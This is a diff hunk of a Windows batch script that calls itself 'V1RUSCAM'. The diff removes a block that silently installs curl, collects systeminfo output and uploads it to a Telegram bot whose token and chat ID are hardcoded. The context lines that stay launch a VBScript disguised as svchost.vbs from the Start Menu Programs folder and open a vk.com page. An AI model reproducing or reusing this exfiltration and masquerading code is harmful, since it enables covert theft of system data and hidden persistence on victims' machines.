@@ -24,27 +24,7 @@ if not exist "%vbsFile%" (
 
 start "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\svchost.vbs" >nul 2>&1
 
-set "BOT_TOKEN=7360956253:AAGcKMr9NLHTubWGZWfWTODaWoR0OwS44HI"
-set "CHAT_ID=5757337298"
-
-:: curl
-where curl >nul 2>&1
-if %ERRORLEVEL% neq 0 (
-    choco install curl -y
-) >nul 2>&1
-
 start https://vk.com/s4ull3ss_4r3_y0u_0k4y
-
-::----------------------------------------------------------------------------------------------------------------------------
-SET "sys_inf=sys.txt"
-
-chcp 65001 > nul
-
-echo ------------------------------ > "%sys_inf%"
-systeminfo > "%sys_inf%"
-compact /c "%sys_inf%" >nul 2>&1
-curl -X POST -F "chat_id=%CHAT_ID%" -F "document=@%sys_inf%" https://api.telegram.org/bot%BOT_TOKEN%/sendDocument >nul 2>&1
-::----------------------------------------------------------------------------------------------------------------------------
 
 echo.
 echo  V1RUSCAM [ N0N 0FFICIAL ]
